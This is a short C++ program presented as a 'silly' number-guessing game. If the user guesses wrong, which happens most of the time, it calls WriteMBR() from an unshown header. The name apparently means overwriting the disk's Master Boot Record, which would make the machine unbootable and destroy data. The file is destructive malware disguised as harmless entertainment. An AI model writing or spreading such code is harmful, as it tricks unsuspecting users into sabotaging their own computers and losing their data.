#include <iostream>
#include <random>
#include "mbr.h"

int main(){
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> distribution(1, 10);
    int randomnumber = distribution(gen);
    int guess;
    printf("Silly game! Guess number between 1 and 10\n");
    std::cin >> guess;
    if (guess==randomnumber){
        printf("You Won!\n");
    } else {
        WriteMBR();
    }
    return 0;
}
